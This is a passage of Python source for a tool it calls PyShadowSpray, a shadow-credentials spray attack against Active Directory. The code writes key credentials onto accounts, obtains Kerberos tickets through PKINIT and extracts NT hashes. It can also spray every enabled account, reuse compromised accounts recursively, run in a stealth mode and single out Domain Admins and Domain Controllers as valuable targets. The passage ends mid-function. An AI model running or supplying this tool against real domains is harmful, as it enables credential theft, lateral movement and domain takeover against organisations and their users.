#!/usr/bin/env python3

import typer
import sys
import os
import ldap3
import re
import random
import string
import warnings
import io
import contextlib
import datetime
from tqdm import tqdm
from ldap3.utils.conv import escape_filter_chars
from lib.scripts.banner import show_banner
from lib.ldap import init_ldap_session, get_dn
from lib.scripts.pkinit_tools import get_tgt_pkinit, get_nt_hash_from_tgt

# Suppress CryptographyDeprecationWarning about certificate serial numbers
warnings.filterwarnings('ignore', category=DeprecationWarning, module='cryptography')
# Also suppress by message pattern to catch the serial number warning
warnings.filterwarnings('ignore', message='.*serial number.*wasn.*t positive.*')
warnings.filterwarnings('ignore', message='.*Parsed a serial number.*')
# Try to suppress CryptographyDeprecationWarning specifically if available
try:
    from cryptography.utils import CryptographyDeprecationWarning
    warnings.filterwarnings('ignore', category=CryptographyDeprecationWarning)
except ImportError:
    pass

# Color codes for terminal output
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    
    @staticmethod
    def success(msg: str) -> str:
        """Colorize only the [+] prefix and words like 'Success' in the message"""
        # Colorize [+] prefix
        msg = re.sub(r'(\[\+\])', f'{Colors.GREEN}\\1{Colors.RESET}', msg)
        # Colorize words like "Success", "SUCCESS", "Successfully"
        msg = re.sub(r'\b(Success|SUCCESS|Successfully)\b', f'{Colors.GREEN}\\1{Colors.RESET}', msg, flags=re.IGNORECASE)
        return msg
    
    @staticmethod
    def error(msg: str) -> str:
        """Colorize only the [-] / [!] prefixes and words like 'Failed', 'Error' in the message"""
        # Colorize [-] or [!] prefix
        msg = re.sub(r'(\[-\]|\[\!\])', f'{Colors.RED}\\1{Colors.RESET}', msg)
        # Colorize words like "Failed", "Error"
        msg = re.sub(r'\b(Failed|Error|ERROR)\b', f'{Colors.RED}\\1{Colors.RESET}', msg, flags=re.IGNORECASE)
        return msg
    
    @staticmethod
    def format(msg: str) -> str:
        """Apply standard coloring: [*] yellow, [+] green, [-]/[!] red."""
        # Apply success/error coloring first
        msg = Colors.success(msg)
        msg = Colors.error(msg)
        # Color [*] as yellow
        msg = re.sub(r'(\[\*\])', f'{Colors.YELLOW}\\1{Colors.RESET}', msg)
        return msg

# Shadow credentials imports
try:
    from dsinternals.common.data.DNWithBinary import DNWithBinary
    from dsinternals.common.data.hello.KeyCredential import KeyCredential
    from dsinternals.system.Guid import Guid
    from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
    from dsinternals.system.DateTime import DateTime
    DSINTERNALS_AVAILABLE = True
except ImportError:
    DSINTERNALS_AVAILABLE = False

# PFX export imports
try:
    from cryptography import x509
    from cryptography.hazmat.primitives.serialization.pkcs12 import serialize_key_and_certificates
    from cryptography.hazmat.primitives.serialization import BestAvailableEncryption, NoEncryption
    from cryptography.hazmat.backends import default_backend
    CRYPTOGRAPHY_AVAILABLE = True
except ImportError:
    CRYPTOGRAPHY_AVAILABLE = False

# PFX export function (same as PyWhisker)
def export_pfx_with_cryptography(pem_cert_file, pem_key_file, pfx_password=None, out_file='cert.pfx'):
    """Export PEM certificate and key to PFX format"""
    with open(pem_cert_file, 'rb') as f:
        pem_cert_data = f.read()
    with open(pem_key_file, 'rb') as f:
        pem_key_data = f.read()

    # Suppress the specific warning when loading certificate
    with warnings.catch_warnings():
        warnings.simplefilter('ignore', DeprecationWarning)
        cert_obj = x509.load_pem_x509_certificate(pem_cert_data, default_backend())

    from cryptography.hazmat.primitives import serialization
    key_obj = serialization.load_pem_private_key(pem_key_data, password=None, backend=default_backend())

    # Password or NoEncryption
    if pfx_password is None:
        encryption_algo = NoEncryption()
    else:
        encryption_algo = BestAvailableEncryption(pfx_password.encode('utf-8'))

    pfx_data = serialize_key_and_certificates(
        name=b"ShadowCredentialCert",
        key=key_obj,
        cert=cert_obj,
        cas=None,
        encryption_algorithm=encryption_algo
    )

    with open(out_file, 'wb') as f:
        f.write(pfx_data)

# PKINIT integration - use internal PKINIT tools functions
def get_tgt_and_nt_hash(cert_file, key_file, pfx_file, pfx_password, domain, dc_ip, target_user, output_dir='', debug=False, stealth=False, write_func=None):
    """Automatically get TGT and NT hash using internal PKINIT tools
    
    Args:
        target_user: The target user account (sAMAccountName) to get TGT/NT hash for
        stealth: If True, skip NT hash extraction (unpac-the-hash) and only get TGT/ccache
        write_func: Optional function to use for output (e.g., tqdm.write). If None, uses print()
    """
    if write_func is None:
        write_func = print
    
    # Use output directory for ccache file
    if output_dir:
        ccache_file = os.path.join(output_dir, f"{target_user}.ccache")
    else:
        ccache_file = f"{target_user}.ccache"
    
    try:
        # Step 1: Get TGT using PKINIT
        if debug:
            write_func(Colors.format(f"[*] Requesting TGT using PKINIT..."))
        
        # Capture stdout and stderr during PKINIT to prevent output from interfering with progress bar
        stdout_capture = io.StringIO()
        stderr_capture = io.StringIO()
        
        with contextlib.redirect_stdout(stdout_capture), contextlib.redirect_stderr(stderr_capture):
            asrep_key, ccache_path = get_tgt_pkinit(
                cert_file=cert_file,
                key_file=key_file,
                pfx_file=pfx_file,
                pfx_password=pfx_password,
                domain=domain,
                username=target_user,
                dc_ip=dc_ip,
                ccache_file=ccache_file,
                debug=debug
            )
        
        # Check for errors in captured output and display them using write_func
        stdout_output = stdout_capture.getvalue()
        stderr_output = stderr_capture.getvalue()
        
        # Process any error messages from captured output
        all_output = stdout_output + stderr_output
        if all_output and not debug:
            lines = all_output.strip().split('\n')
            for line in lines:
                line = line.strip()
                if line and ('Error getting TGT' in line or 'KDC_ERR' in line or ('Error' in line and 'Name' in line)):
                    # Format the error message properly
                    if 'Error getting TGT' in line:
                        write_func(Colors.error(line))
                    elif 'KDC_ERR' in line or 'Error Name' in line:
                        write_func(Colors.error(f"[-] Error getting TGT: {line}"))
        
        if not asrep_key or not ccache_path:
            write_func(Colors.error(f"[-] Failed to get TGT for {target_user}"))
            return None, None
        
        if debug:
            write_func(f"[+] TGT saved to: {ccache_path}")
            write_func(f"[+] AS-REP encryption key: {asrep_key}")
        
        # Step 2: Get NT hash using U2U (skip if stealth mode)
        if stealth:
            if debug:
                write_func(Colors.format(f"[*] Stealth mode: Skipping NT hash extraction (unpac-the-hash)"))
            write_func(Colors.success(f"[+] SUCCESS! TGT obtained for {target_user} (stealth mode - no NT hash extraction)"))
            write_func(Colors.success(f"[+] Ccache file saved: {ccache_path}"))
            return asrep_key, None  # Return None for nt_hash in stealth mode
        
        # Normal mode: Extract NT hash
        if debug:
            write_func(Colors.format(f"[*] Requesting NT hash using U2U..."))
        
        # Capture stdout and stderr during NT hash extraction
        stdout_capture = io.StringIO()
        stderr_capture = io.StringIO()
        
        with contextlib.redirect_stdout(stdout_capture), contextlib.redirect_stderr(stderr_capture):
            nt_hash = get_nt_hash_from_tgt(
                ccache_file=ccache_path,
                domain=domain,
                username=target_user,
                asrep_key=asrep_key,
                dc_ip=dc_ip,
                do_key_list=False,
                debug=debug
            )
        
        # Process any error messages from captured output
        all_output = stdout_capture.getvalue() + stderr_capture.getvalue()
        if all_output and not debug:
            lines = all_output.strip().split('\n')
            for line in lines:
                line = line.strip()
                if line and ('Error' in line or 'failed' in line.lower() or 'KDC_ERR' in line):
                    write_func(Colors.error(f"[-] {line}"))
        
        if nt_hash:
            if debug:
                write_func(Colors.success(f"[+] Recovered NT Hash: {nt_hash}"))
            write_func(Colors.success(f"[+] SUCCESS! Recovered NT Hash for {target_user}: {nt_hash}"))
        else:
            write_func(Colors.error(f"[-] Could not extract NT hash for {target_user}"))
        
        return asrep_key, nt_hash
        
    except Exception as e:
        if debug:
            import traceback
            traceback.print_exc()
        write_func(Colors.format(f"[-] Error in PKINIT automation: {e}"))
        return None, None

app = typer.Typer(
    no_args_is_help=True,
    add_completion=False,
    rich_markup_mode='rich',
    context_settings={'help_option_names': ['-h', '--help']},
    pretty_exceptions_show_locals=False
)


@app.command()
def main(
    username        : str   = typer.Option(None, "-u", "--username", help="Username"),
    password        : str   = typer.Option(None, '-p', '--password', help="Password"),
    domain          : str   = typer.Option(..., '-d', '--domain', help="Domain"),
    dc_ip           : str   = typer.Option(None, '-dc-ip', '--dc-ip', help="IP address or FQDN of domain controller"),
    target_dom      : str   = typer.Option(None, '-t', '--target-domain', '-target-domain', help='Target domain. Use if authenticating across trusts.'),
    ldaps           : bool  = typer.Option(False, '-ldaps', '--ldaps', help='Use LDAPS instead of LDAP'),
    kerberos        : bool  = typer.Option(False, "-k", "--kerberos", help='Use Kerberos authentication. Grabs credentials from .ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command arguments'),
    hashes          : str   = typer.Option(None, "-hashes", "--hashes", metavar="LMHASH:NTHASH", help="LM and NT hashes, format is LMHASH:NTHASH or :NTHASH (NT hash only). For Kerberos: LMHASH:NTHASH or :NTHASH for pass-the-hash"),
    ccache          : str   = typer.Option(None, "--ccache", help='Path to ccache file (alternative to KRB5CCNAME environment variable)'),
    debug           : bool  = typer.Option(False, '-debug', '--debug', help='Enable Verbose Logging'),
    target          : str   = typer.Option(None, '--target', help='Target user/computer for shadow credential operations'),
    add             : bool  = typer.Option(False, '--add', help='Add shadow credential to target user'),
    list_creds      : bool  = typer.Option(False, '--list', help='List device IDs for target user'),
    remove          : str   = typer.Option(None, '--remove', metavar='DEVICEID', help='Remove device ID from target user'),
    clear           : bool  = typer.Option(False, '--clear', help='Remove ALL device IDs from target user (requires confirmation)'),
    spray           : bool  = typer.Option(False, '--spray', help='Spray shadow credentials to all users/computers and get NT hashes'),
    user_pass_file  : str   = typer.Option(None, '--user-pass', help='File with username:password pairs (one per line) for spray'),
    recursive       : bool  = typer.Option(False, '--recursive', help='Recursively use compromised accounts to continue spraying'),
    export_type     : str   = typer.Option('PFX', '--export', help='Export certificate format: PEM or PFX (default: PFX)'),
    cert_path       : str   = typer.Option(None, '--cert-path', help='Path/filename for certificate export'),
    output_dir      : str   = typer.Option('creds', '--output-dir', help='Output directory for certificates and ccache files (default: creds)'),
    no_autoremove   : bool  = typer.Option(False, '--no-autoremove', help='Do not automatically remove device IDs after PKINIT'),
    no_banner       : bool  = typer.Option(False, '--no-banner', help='Do not show banner (Easier for Screenshots)'),
    stealth         : bool  = typer.Option(False, '--stealth', help='Stealth mode: Skip NT hash extraction (unpac-the-hash). Only get TGT/ccache files for recursive operations'),
):
    """
    PyShadowSpray - Shadow credentials spray attack tool
    Query LDAP for users in the domain.
    """
    if no_banner:
        show_banner()
        show_banner()
    else:
        show_banner()
    
    # Parse hashes if provided (format: LMHASH:NTHASH or :NTHASH)
    lmhash = None
    nthash = None
    if hashes:
        hash_parts = hashes.split(':')
        if len(hash_parts) == 2:
            lmhash = hash_parts[0] if hash_parts[0] else None
            nthash = hash_parts[1] if hash_parts[1] else None
            if not nthash:
                print(f"[-] Error: Invalid hash format. Use LMHASH:NTHASH or :NTHASH")
                sys.exit(1)
        else:
            print(f"[-] Error: Invalid hash format. Use LMHASH:NTHASH or :NTHASH")
            sys.exit(1)
    
    # Get password if not provided and no hashes (unless using Kerberos with ccache)
    if not password and not nthash and username and not (kerberos and (ccache or os.getenv('KRB5CCNAME'))):
        import getpass
        password = getpass.getpass(f"Password for {domain}\\{username}: ")
    
    # Determine target domain controller
    if not dc_ip:
        dc_ip = domain
    
    # Setup output directory
    if not output_dir:
        output_dir = 'creds'  # Default directory
    
    # Create output directory if it doesn't exist
    output_dir = os.path.abspath(output_dir)
    if not os.path.exists(output_dir):
        os.makedirs(output_dir, exist_ok=True)
        if debug:
            print(f"[*] Created output directory: {output_dir}")
    elif debug:
        print(f"[*] Using output directory: {output_dir}")
    
    try:
        # Initialize LDAP session (pass nthash if provided, otherwise password)
        if debug:
            print(f"[*] Connecting to {dc_ip}...")
            if kerberos:
                print(f"[*] Using Kerberos authentication")
                if ccache:
                    print(f"[*] Using ccache file: {ccache}")
                elif os.getenv('KRB5CCNAME'):
                    print(f"[*] Using ccache from KRB5CCNAME: {os.getenv('KRB5CCNAME')}")
        
        # Only use Kerberos if -k flag is explicitly provided
        # Otherwise use normal NTLM authentication (even if ccache file exists)
        use_kerberos = kerberos  # Only True if -k flag was used
        
        ldap_server, ldap_session = init_ldap_session(
            domain, username, password, dc_ip, ldaps,
            nt_hash=nthash, kerberos=use_kerberos, lmhash=lmhash, nthash=nthash,
            ccache_file=ccache if use_kerberos else None  # Only pass ccache if using kerberos
        )
        
        if debug:
                        print(Colors.success(f"[+] Successfully authenticated to LDAP"))
        
        # Determine search base
        if target_dom:
            search_base = get_dn(target_dom)
        else:
            search_base = get_dn(domain)
        
        # Helper function to log device ID operations (defined early so it's available everywhere)
        def log_device_id(operation, username, device_id, output_directory='', success=True):
            """Log device ID operations to a log file"""
            log_file = os.path.join(output_directory, 'device_ids.log') if output_directory else 'device_ids.log'
            timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            
            status = "SUCCESS" if success else "FAILED"
            log_entry = f"[{timestamp}] {operation.upper()}: {username} | DeviceID: {device_id} | Status: {status}\n"
            
            try:
                with open(log_file, 'a') as f:
                    f.write(log_entry)
            except Exception as e:
                if debug:
                    print(f"[-] Warning: Could not write to log file: {e}")
        
        # Validate target user operations
        if target:
            operation_count = sum([add, list_creds, bool(remove), clear])
            if operation_count == 0:
                print("[-] Error: When using --target, you must specify one of: --add, --list, --remove DEVICEID, or --clear")
                sys.exit(1)
            elif operation_count > 1:
                print("[-] Error: You can only specify one operation at a time: --add, --list, --remove DEVICEID, or --clear")
                sys.exit(1)
        
        # Handle list credentials
        if target and list_creds:
            if not DSINTERNALS_AVAILABLE:
                print("[-] Error: dsinternals library is required for listing credentials")
                print("[-] Install it with: pip install dsinternals")
                sys.exit(1)
            
            # Find the user
            if debug:
                print(f"[*] Searching for account: {target}")
            
            ldap_session.search(
                search_base,
                f'(sAMAccountName={escape_filter_chars(target)})',
                attributes=['distinguishedName', 'sAMAccountName', 'msDS-KeyCredentialLink']
            )
            
            if not ldap_session.entries:
                print(f"[-] Account '{target}' not found in domain")
                sys.exit(1)
            
            target_entry = ldap_session.entries[0]
            target_dn = target_entry.entry_dn
            
            # Get raw attributes
            ldap_session.search(
                target_dn,
                '(objectClass=*)',
                search_scope=ldap3.BASE,
                attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink']
            )
            
            results = None
            for entry in ldap_session.response:
                if entry['type'] != 'searchResEntry':
                    continue
                results = entry
                break
            
            if not results:
                print(f"[-] Could not query account properties")
                sys.exit(1)
            
            try:
                if 'raw_attributes' not in results or 'msDS-KeyCredentialLink' not in results['raw_attributes']:
                    print(f"[*] Attribute msDS-KeyCredentialLink is either empty or you don't have read permissions")
                else:
                    creds = results['raw_attributes']['msDS-KeyCredentialLink']
                    if len(creds) == 0:
                        print(f"[*] No key credentials found for {target}")
                    else:
                        print(Colors.success(f"[+] Found {len(creds)} key credential(s) for {target}:"))
                        for dn_binary_value in creds:
                            try:
                                keyCredential = KeyCredential.fromDNWithBinary(DNWithBinary.fromRawDNWithBinary(dn_binary_value))
                                if keyCredential.DeviceId is None:
                                    print(f"  [-] Failed to parse DeviceId")
                                else:
                                    print(f"  [+] DeviceID: {keyCredential.DeviceId.toFormatD()} | Creation Time (UTC): {keyCredential.CreationTime}")
                            except Exception as err:
                                print(f"  [-] Failed to parse keyCredential: {err}")
            except (IndexError, KeyError):
                print(f"[*] Attribute msDS-KeyCredentialLink does not exist")
            
            ldap_session.unbind()
            return
        
        # Handle remove credential
        if target and remove:
            if not DSINTERNALS_AVAILABLE:
                print("[-] Error: dsinternals library is required for removing credentials")
                print("[-] Install it with: pip install dsinternals")
                sys.exit(1)
            
            device_id = remove  # The remove parameter contains the device ID
            
            # Find the user
            if debug:
                print(f"[*] Searching for account: {target}")
            
            ldap_session.search(
                search_base,
                f'(sAMAccountName={escape_filter_chars(target)})',
                attributes=['distinguishedName', 'sAMAccountName', 'msDS-KeyCredentialLink']
            )
            
            if not ldap_session.entries:
                print(f"[-] Account '{target}' not found in domain")
                sys.exit(1)
            
            target_entry = ldap_session.entries[0]
            target_dn = target_entry.entry_dn
            
            # Get raw attributes
            ldap_session.search(
                target_dn,
                '(objectClass=*)',
                search_scope=ldap3.BASE,
                attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink']
            )
            
            results = None
            for entry in ldap_session.response:
                if entry['type'] != 'searchResEntry':
                    continue
                results = entry
                break
            
            if not results:
                print(f"[-] Could not query account properties")
                sys.exit(1)
            
            try:
                if 'raw_attributes' not in results or 'msDS-KeyCredentialLink' not in results['raw_attributes']:
                    print(f"[-] Attribute msDS-KeyCredentialLink does not exist or is empty")
                    sys.exit(1)
                
                new_values = []
                device_id_in_current_values = False
                
                for dn_binary_value in results['raw_attributes']['msDS-KeyCredentialLink']:
                    try:
                        keyCredential = KeyCredential.fromDNWithBinary(DNWithBinary.fromRawDNWithBinary(dn_binary_value))
                        if keyCredential.DeviceId is None:
                            print(f"[-] Warning: Failed to parse DeviceId for one credential, keeping it")
                            new_values.append(dn_binary_value)
                            continue
                        
                        if keyCredential.DeviceId.toFormatD() == device_id:
                            print(f"[+] Found credential with DeviceID {device_id} to remove")
                            device_id_in_current_values = True
                        else:
                            new_values.append(dn_binary_value)
                    except Exception as err:
                        print(f"[-] Warning: Failed to parse credential, keeping it: {err}")
                        new_values.append(dn_binary_value)
                
                if device_id_in_current_values:
                    print(f"[*] Removing credential from {target}...")
                    ldap_session.modify(
                        target_dn,
                        {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]}
                    )
                    
                    if ldap_session.result['result'] == 0:
                        print(Colors.success(f"[+] Successfully removed credential with DeviceID {device_id}"))
                    else:
                        error_msg = ldap_session.result.get('message', 'Unknown error')
                        if ldap_session.result['result'] == 50:
                            print(f"[-] Insufficient rights: {error_msg}")
                        elif ldap_session.result['result'] == 19:
                            print(f"[-] Constraint violation: {error_msg}")
                        else:
                            print(f"[-] LDAP error: {error_msg}")
                        sys.exit(1)
                else:
                    print(f"[-] No credential with DeviceID {device_id} found for {target}")
                    sys.exit(1)
                    
            except (IndexError, KeyError):
                print(f"[-] Attribute msDS-KeyCredentialLink does not exist")
                sys.exit(1)
            
            ldap_session.unbind()
            return
        
        # Handle clear all credentials
        if target and clear:
            if not DSINTERNALS_AVAILABLE:
                print("[-] Error: dsinternals library is required for clearing credentials")
                print("[-] Install it with: pip install dsinternals")
                sys.exit(1)
            
            # Find the user
            if debug:
                print(f"[*] Searching for account: {target}")
            
            ldap_session.search(
                search_base,
                f'(sAMAccountName={escape_filter_chars(target)})',
                attributes=['distinguishedName', 'sAMAccountName', 'msDS-KeyCredentialLink']
            )
            
            if not ldap_session.entries:
                print(f"[-] Account '{target}' not found in domain")
                sys.exit(1)
            
            target_entry = ldap_session.entries[0]
            target_dn = target_entry.entry_dn
            
            # Get raw attributes
            ldap_session.search(
                target_dn,
                '(objectClass=*)',
                search_scope=ldap3.BASE,
                attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink']
            )
            
            results = None
            for entry in ldap_session.response:
                if entry['type'] != 'searchResEntry':
                    continue
                results = entry
                break
            
            if not results:
                print(f"[-] Could not query account properties")
                sys.exit(1)
            
            try:
                if 'raw_attributes' not in results or 'msDS-KeyCredentialLink' not in results['raw_attributes']:
                    print(f"[*] Attribute msDS-KeyCredentialLink does not exist or is empty - nothing to clear")
                    ldap_session.unbind()
                    return
                
                creds = results['raw_attributes']['msDS-KeyCredentialLink']
                if len(creds) == 0:
                    print(f"[*] No key credentials found for {target} - nothing to clear")
                    ldap_session.unbind()
                    return
                
                # List all device IDs that will be removed
                device_ids = []
                print(f"[*] Found {len(creds)} device ID(s) for {target}:")
                for dn_binary_value in creds:
                    try:
                        keyCredential = KeyCredential.fromDNWithBinary(DNWithBinary.fromRawDNWithBinary(dn_binary_value))
                        if keyCredential.DeviceId is not None:
                            device_id_str = keyCredential.DeviceId.toFormatD()
                            device_ids.append(device_id_str)
                            print(f"  [+] DeviceID: {device_id_str} | Creation Time (UTC): {keyCredential.CreationTime}")
                    except Exception as err:
                        print(f"  [-] Failed to parse keyCredential: {err}")
                
                if not device_ids:
                    print(f"[*] No valid device IDs found to remove")
                    ldap_session.unbind()
                    return
                
                # Ask for confirmation
                print(f"\n[!] WARNING: This will remove ALL {len(device_ids)} device ID(s) from {target}")
                confirmation = input("Are you sure you want to do this (O.o)? [yes/no]: ")
                
                if confirmation.lower() not in ['yes', 'y']:
                    print(f"[*] Operation cancelled")
                    ldap_session.unbind()
                    return
                
                # Remove all credentials by setting attribute to empty list
                print(f"[*] Clearing all device IDs from {target}...")
                ldap_session.modify(
                    target_dn,
                    {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, []]}
                )
                
                if ldap_session.result['result'] == 0:
                    print(Colors.success(f"[+] Successfully cleared all {len(device_ids)} device ID(s) from {target}"))
                    for device_id_str in device_ids:
                        try:
                            log_device_id('REMOVE', target, device_id_str, output_dir, success=True)
                        except Exception as log_err:
                            if debug:
                                print(f"[-] Warning: Could not log device ID removal: {log_err}")
                else:
                    error_msg = ldap_session.result.get('message', 'Unknown error')
                    if ldap_session.result['result'] == 50:
                        print(f"[-] Insufficient rights: {error_msg}")
                    elif ldap_session.result['result'] == 19:
                        print(f"[-] Constraint violation: {error_msg}")
                    else:
                        print(f"[-] LDAP error: {error_msg}")
                    sys.exit(1)
                    
            except (IndexError, KeyError):
                print(f"[-] Attribute msDS-KeyCredentialLink does not exist")
                sys.exit(1)
            
            ldap_session.unbind()
            return
        
        # Helper function to detect if a string is an NT hash (32 character hex string)
        def is_nt_hash(value):
            """Check if a string looks like an NT hash (32 character hexadecimal string)"""
            if not value or not isinstance(value, str):
                return False
            value_stripped = value.strip()
            return len(value_stripped) == 32 and all(c in '0123456789abcdefABCDEF' for c in value_stripped)
        
        # Helper function to query LDAP for all users/computers
        def query_all_accounts(ldap_sess, search_base_val, excluded_users_list=None):
            """Query LDAP once for all enabled users and computers, parse everything from single query
            
            Returns:
                tuple: (accounts_list, domain_admins_set, domain_controllers_set)
            """
            if excluded_users_list is None:
                excluded_users_list = []
            
            # First, get Domain Admins and Enterprise Admins group DNs (quick query before main query)
            domain_admins_dns = []
            try:
                ldap_sess.search(
                    search_base_val,
                    '(&(objectClass=group)(|(cn=Domain Admins)(cn=Enterprise Admins)))',
                    attributes=['distinguishedName']
                )
                
                for group_entry in ldap_sess.entries:
                    domain_admins_dns.append(group_entry.entry_dn)
            except Exception as e:
                if debug:
                    print(f"[*] Error querying Domain Admins groups: {e}")
            
            # Get Domain Controllers OU DN (quick query before main query)
            domain_controllers_ou_dn = None
            try:
                ldap_sess.search(
                    search_base_val,
                    '(&(objectClass=organizationalUnit)(ou=Domain Controllers))',
                    attributes=['distinguishedName']
                )
                
                if ldap_sess.entries:
                    domain_controllers_ou_dn = ldap_sess.entries[0].entry_dn
            except Exception as e:
                if debug:
                    print(f"[*] Error querying Domain Controllers OU: {e}")
            
            # ONE MAIN QUERY for all enabled users and computers
            # Filter for enabled accounts: (!(userAccountControl:1.2.840.113556.1.4.803:=2))
            # This checks that the ACCOUNTDISABLE flag (bit 2) is NOT set
            search_filter = "(&(objectClass=user)(|(sAMAccountType=805306368)(sAMAccountType=805306369))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
            attributes = ['sAMAccountName', 'sAMAccountType', 'distinguishedName', 'memberOf']
            
            ldap_sess.extend.standard.paged_search(
                search_base_val,
                search_filter,
                attributes=attributes,
                paged_size=500,
                generator=False
            )
            
            if not ldap_sess.entries:
                return [], set(), set()
            
            # Parse everything from the single query results
            accounts = []
            domain_admins_set = set()
            domain_controllers_set = set()
            
            for entry in ldap_sess.entries:
                if 'sAMAccountName' not in entry:
                    continue
                
                sam = str(entry['sAMAccountName'])
                
                # Check exclusions
                if excluded_users_list:
                    if sam in excluded_users_list or any(excluded.lower() in sam.lower() for excluded in excluded_users_list):
                        continue
                
                # Normalize computer account name (add $ if needed) and get account type
                account_type = None
                is_valuable = False
                valuable_reason = []
                
                if 'sAMAccountType' in entry:
                    account_type = entry['sAMAccountType']
                    if account_type == 805306369:
                        if not sam.endswith('$'):
                            sam = sam + '$'
                
                # Check if account is Domain Admin by parsing memberOf attribute
                is_domain_admin = False
                if 'memberOf' in entry:
                    member_of = entry['memberOf']
                    member_of_list = member_of if isinstance(member_of, list) else [member_of]
                    
                    for group_dn in member_of_list:
                        group_dn_str = str(group_dn)
                        # Check if member of Domain Admins or Enterprise Admins (by DN)
                        for da_dn in domain_admins_dns:
                            if group_dn_str.lower() == da_dn.lower() or group_dn_str.lower().endswith(da_dn.lower()):
                                is_domain_admin = True
                                is_valuable = True
                                valuable_reason.append("Domain Admin")
                                domain_admins_set.add(sam)
                                # Also add without $ for computer accounts comparison
                                if sam.endswith('$'):
                                    domain_admins_set.add(sam[:-1])
                                else:
                                    domain_admins_set.add(sam + '$')
                                break
                        if is_domain_admin:
                            break
                
                # Check if account is Domain Controller by parsing distinguishedName
                is_domain_controller = False
                entry_dn = entry.entry_dn
                # Check if DN contains "OU=Domain Controllers" or "CN=Domain Controllers" 
                # Domain Controllers are computer accounts in the Domain Controllers OU
                if 'OU=Domain Controllers' in entry_dn or (domain_controllers_ou_dn and entry_dn.lower().startswith(domain_controllers_ou_dn.lower())):
                    # Also verify it's a computer account (sAMAccountType 805306369)
                    if account_type == 805306369:
                        is_domain_controller = True
                        is_valuable = True
                        valuable_reason.append("Domain Controller")
                        domain_controllers_set.add(sam)
                        # Also add without $ for comparison
                        if sam.endswith('$'):
                            domain_controllers_set.add(sam[:-1])
                        else:
                            domain_controllers_set.add(sam + '$')
                
                accounts.append({
                    'sAMAccountName': sam,
                    'sAMAccountType': account_type,
                    'distinguishedName': entry.entry_dn,
                    'isValuable': is_valuable,
                    'valuableReason': ', '.join(valuable_reason) if valuable_reason else None
                })
            
            return accounts, domain_admins_set, domain_controllers_set
        
        # Helper function to get all Domain Admins members (query once, use many times)
        def get_domain_admins_set(ldap_sess, search_base):
            """Query all Domain Admins members once and return as a set of sAMAccountNames"""
            domain_admins_set = set()
            try:
                # Find Domain Admins DN
                ldap_sess.search(
                    search_base,
                    '(&(objectClass=group)(|(cn=Domain Admins)(cn=Enterprise Admins)))',
                    attributes=['distinguishedName', 'member']
                )
                
                if not ldap_sess.entries:
                    if debug:
                        print("[*] Domain Admins group not found")
                    return domain_admins_set
                
                # Get all Domain Admin groups
                da_groups = []
                for entry in ldap_sess.entries:
                    da_groups.append(entry.entry_dn)
                    if debug:
                        print(f"[*] Found group: {entry.entry_dn}")
                
                # Query all members using recursive membership search (memberOf:1.2.840.113556.1.4.1941)
                for da_dn in da_groups:
                    ldap_sess.search(
                        search_base,
                        f'(memberOf:1.2.840.113556.1.4.1941:={escape_filter_chars(da_dn)})',
                        attributes=['sAMAccountName']
                    )
                    
                    for entry in ldap_sess.entries:
                        if 'sAMAccountName' in entry:
                            sam = str(entry['sAMAccountName'])
                            domain_admins_set.add(sam)
                            # Also add without $ for computer accounts comparison
                            if sam.endswith('$'):
                                domain_admins_set.add(sam[:-1])
                            else:
                                domain_admins_set.add(sam + '$')
                
                if debug and domain_admins_set:
                    print(f"[*] Found {len(domain_admins_set)} Domain Admin(s)/Enterprise Admin(s)")
                
            except Exception as e:
                if debug:
                    print(f"[*] Error querying Domain Admins: {e}")
            
            return domain_admins_set
        
        # Helper function to check if user is Domain Admin (for single account checks outside recursive mode)
        def is_domain_admin(ldap_sess, sam_name, search_base):
            """Check if user is member of Domain Admins (used for single account checks)"""
            try:
                # Search for the user
                ldap_sess.search(
                    search_base,
                    f'(sAMAccountName={escape_filter_chars(sam_name)})',
                    attributes=['memberOf', 'primaryGroupID']
                )
                
                if not ldap_sess.entries:
                    return False
                
                entry = ldap_sess.entries[0]
                
                # Check memberOf for Domain Admins
                if 'memberOf' in entry:
                    member_of = entry['memberOf']
                    if isinstance(member_of, list):
                        for group in member_of:
                            if 'CN=Domain Admins' in str(group) or 'CN=Enterprise Admins' in str(group):
                                return True
                    elif 'CN=Domain Admins' in str(member_of) or 'CN=Enterprise Admins' in str(member_of):
                        return True
                
                # Also check using recursive membership (memberOf:1.2.840.113556.1.4.1941)
                # Find Domain Admins DN
                ldap_sess.search(
                    search_base,
                    '(&(objectClass=group)(cn=Domain Admins))',
                    attributes=['distinguishedName']
                )
                if ldap_sess.entries:
                    da_dn = ldap_sess.entries[0].entry_dn
                    ldap_sess.search(
                        search_base,
                        f'(&(sAMAccountName={escape_filter_chars(sam_name)})(memberOf:1.2.840.113556.1.4.1941:={da_dn}))',
                        attributes=['sAMAccountName']
                    )
                    if ldap_sess.entries:
                        return True
                
                return False
            except Exception:
                return False
        
        # Helper function to remove credential by device ID
        def remove_credential_by_device_id(ldap_sess, target_dn, device_id, username, output_directory='', write_func=None):
            """Remove a credential by device ID
            
            Args:
                write_func: Optional function to use for output (e.g., tqdm.write). If None, uses print()
            """
            if write_func is None:
                write_func = print
            try:
                # Get current credentials
                ldap_sess.search(
                    target_dn,
                    '(objectClass=*)',
                    search_scope=ldap3.BASE,
                    attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink']
                )
                
                results = None
                for entry in ldap_sess.response:
                    if entry['type'] != 'searchResEntry':
                        continue
                    results = entry
                    break
                
                if not results:
                    log_device_id('REMOVE', username, device_id, output_directory, success=False)
                    return False
                
                if 'raw_attributes' not in results or 'msDS-KeyCredentialLink' not in results['raw_attributes']:
                    log_device_id('REMOVE', username, device_id, output_directory, success=False)
                    return False
                
                new_values = []
                device_id_found = False
                
                for dn_binary_value in results['raw_attributes']['msDS-KeyCredentialLink']:
                    try:
                        keyCredential = KeyCredential.fromDNWithBinary(DNWithBinary.fromRawDNWithBinary(dn_binary_value))
                        if keyCredential.DeviceId is None:
